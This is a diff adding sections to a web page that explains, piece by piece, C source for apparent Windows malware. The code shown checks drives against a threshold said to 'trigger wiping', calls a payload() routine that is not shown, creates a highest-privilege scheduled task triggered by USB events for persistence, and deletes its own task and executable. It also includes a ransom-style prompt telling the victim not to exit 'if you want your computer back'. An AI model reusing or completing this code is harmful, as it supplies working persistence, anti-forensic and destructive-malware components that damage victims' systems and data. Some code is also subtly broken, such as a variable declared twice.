@@ -236,6 +236,105 @@ decare <mark>returned</mark> of type DWORD (for those new to win api, DWORD is l
     return 0;
 } 
 </code></pre>
+<p> get drive size<br>
+inits free_bytes, total_btyes, total_free<br>
+<mark>GetDiskFreeSpaceExW</mark> to get free space, returns total_bytes, total - free = used (<mark>.QuadPart</mark> is 64 bit int win32)</p>
+<pre><code class="language-c">
+    DWORD drive_mask; //global
+    ULONGLONG threshold = 4ULL * 1024 * 1024 * 1024;
+</code></pre>
+<p> inits int drive mask and 4gb, we use 4gb as a threshold to see if a drive is important enough to trigger wiping</p>
+<pre><code class="language-c">
+    void check_new_usb() {
+        drive_mask = GetLogicalDrives(); // gets bitmask of all drives
+        check_usb_threshold(threshold);
+    }
+</code></pre>
+<p> checks usb, checks if usb meets threshold(4gb)</p>
+<pre><code class="language-c">
+    void task_sch_usb() {
+        if (!past_usb_check()) {
+            return;
+        }
+        char exepath[MAX_PATH];
+        char cmd[MAX_PATH + 512];
+        if (!GetModuleFileNameA(NULL, exepath, MAX_PATH)) return;
+
+        sprintf(cmd,
+            "schtasks /create /tn \"%s\" /tr \"%s usb_check\" /sc ONEVENT "
+            "/ec System /mo \"*[System[Provider[@Name='Kernel-PnP'] and EventID=200]]\" "
+            "/rl highest /f",
+            rand_nm, exepath);
+        system(cmd);
+    
+    }
+</code></pre>
+<p> if theres no past usb's fallback to schedule on logon<br>
+creates task with custom event (as defined earlier with usb threshold)<br>
+montier <mark>"*[System[Provider[@Name='Kernel-PnP'] and EventID=200]]\"</mark> becauase thats the usb event register<br>
+use <mark>sprintf</mark> to store and <mark>system(cmd)</mark> to run</p>
+<pre><code class="language-c">
+    void check_usb_threshold(ULONGLONG threshold) {
+        for (int b = 0; b &lt; 26; b++) {
+                if (drive_mask & (1 &lt;&lt; b)) {
+                    wchar_t drive[4] = {L'A' + b, L':', L'\\', L'\0'};
+                    ULONGLONG used = used_space_drive(drive);
+                if (used >= threshold) {
+                    payload();
+                    break;
+                }
+            }
+        }
+    }
+</code></pre>
+<p> check all usb's if they meet threshold, is so call <mark>payload()</mark></p>
+<pre><code class="language-c">
+    void safe() {
+        // rm scheduled tsk
+        char cmd[MAX_PATH + 256];
+        sprintf(cmd, "schtasks /delete /tn \"%s\" /f", rand_nm);
+        system(cmd);
+    
+        //delete itself
+        //uses localhost as a delay method 
+        char cmd[MAX_PATH + 64];
+        GetModuleFileNameA(NULL, cmd, MAX_PATH);
+        char rm_cmd[MAX_PATH + 128];
+        sprintf(rm_cmd, "cmd /c ping 127.0.0.1 -n 2 > nul && del \"%s\"", cmd);
+        system(rm_cmd);
+
+}
+</code></pre>
+<p> create <mark>cmd</mark> self deletion as explained earlier</p>
+<pre><code class="langauge-c">
+    void game() {
+        SetConsoleTitleA("Screen");
+
+        printf("=== Let's Play a little Game ===\n");
+        printf("If you want your computer back...\n");
+        printf("I wouldn't exit this program if I were you");
+
+        srand(time(NULL));
+	    const char *dict[] = {"", "rock", "paper", "scissors"};
+	    int robot = rand() % 3 + 1;
+	    int play;
+        char input[16];
+
+	    while (1){
+            printf("rock(1), paper(2), scissors(3) >:");
+            if (!fgets(input, sizeof(input), stdin)) 
+                continue;
+
+            if (sscanf(input, "%d", &play) !=1 || play<1 || play>3){ // from Tyler, input handling
+                printf("1, 2 or 3!!!\n invalid input ");
+                continue;
+            }
+            break; // valid input 
+        }
+    }
+</code></pre>
+<p> simple rock paper scissors using circular math, <mark>sscanf</mark> and <mark>fgets</mark> input handling come from a student at NMT</p>
+
     <!-- Prism JS -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.30.0/prism.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.30.0/components/prism-python.min.js"></script>
